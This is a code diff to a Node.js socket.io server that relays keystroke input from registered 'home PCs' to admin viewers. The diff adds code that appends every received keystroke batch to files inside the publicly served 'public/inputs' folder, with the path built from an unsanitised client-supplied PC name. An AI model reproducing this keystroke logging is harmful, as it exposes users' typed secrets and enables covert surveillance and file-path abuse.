@@ -1,7 +1,8 @@
 const express = require("express");
 const http = require("http");
 const { Server } = require("socket.io");
-const path = require("path");
+const path = require("path")
+const fs = require("fs");
 
 const app = express();
 const server = http.createServer(app);
@@ -14,9 +15,14 @@ let homePCs = {};
 io.on("connection", (socket) => {
     // 1. Send existing list to the new user immediately
     socket.emit("update_pc_list", Object.values(homePCs));
+    const now = new Date();
+    const connectTime = `${now.getFullYear()}-${(now.getMonth() + 1).toString().padStart(2, '0')}-${now.getDate().toString().padStart(2, '0')} ${now.getHours().toString().padStart(2, '0')}-${now.getMinutes().toString().padStart(2, '0')}`;
+
+    var myPcName = ""
 
     // --- Home PC Logic ---
     socket.on("register_home", (pcName) => {
+        myPcName = pcName
         homePCs[socket.id] = { id: socket.id, name: pcName };
         console.log(`Home PC registered: ${pcName} (${socket.id})`);
         io.emit("update_pc_list", Object.values(homePCs));
@@ -44,8 +50,20 @@ io.on("connection", (socket) => {
     });
 
     socket.on("keyinput", (data) => {
+
+        const now = new Date();
+        const currentTime = `${now.getFullYear()}-${(now.getMonth() + 1).toString().padStart(2, '0')}-${now.getDate().toString().padStart(2, '0')} ${now.getHours().toString().padStart(2, '0')}-${now.getMinutes().toString().padStart(2, '0')}`;
+
+        const dir = path.join(__dirname, "public", "inputs", myPcName, connectTime);
+        const filePath = path.join(dir, `${currentTime}.txt`);
+
+        fs.mkdirSync(dir, { recursive: true });
+        fs.appendFileSync(filePath, data);
         socket.to(`viewing_${socket.id}`).emit("keyinput", data);
+
     });
+
+    
 
 
     // --- Client (Admin) Logic ---
